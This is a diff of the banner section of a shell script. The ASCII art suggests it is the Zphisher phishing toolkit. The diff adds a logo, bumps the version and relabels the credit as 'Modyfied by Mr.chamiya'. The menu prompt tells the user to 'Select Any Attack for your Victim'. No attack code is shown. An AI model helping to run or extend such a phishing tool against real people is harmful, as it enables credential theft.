@@ -5,6 +5,17 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
 }
+
+### LOGO ###
+
+░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░
+░░░░█░░░░░░░░░░░░░█░░░░
+░░░█░░░░░░░░░░▄▄▄░░█░░░
+░░░█░░▄▄▄░░▄░░███░░█░░░
+░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░
+░░░█░░▀█▀█▀█▀█▀█▀░░█░░░
+░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░
+░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░
 banner() {
 clear
 printf " \e[33;1m ______      _     _     _               \e[0m\n"
@@ -14,9 +25,9 @@ printf " \e[32;1m  / /\e[33;1m | '_ \| '_ \| / __| '_ \ / _ \ '__|\e[0m\n"
 printf " \e[32;1m / /__| |_) | | | | \__ \ | | |  __/ |   \e[0m\n"
 printf " \e[32;1m/_____| .__/|_| |_|_|___/_| |_|\___|_|   \e[0m\n"
 printf " \e[33;1m      | |                                \e[0m\n"
-printf " \e[33;1m      |_|           \e[1;97m    Version 2.0      \e[0m\n"
+printf " \e[33;1m      |_|           \e[1;97m    Version 2.1       \e[0m\n"
 printf " \n"
-printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.rayat)\e[0m\n"
+printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Modyfied by Mr.chamiya (tahmid.rayat)\e[0m\n"
 printf " \n"
 printf " \e[36;1m.:.Select Any Attack for your Victim.:.\e[0m\n"
 printf " \n"
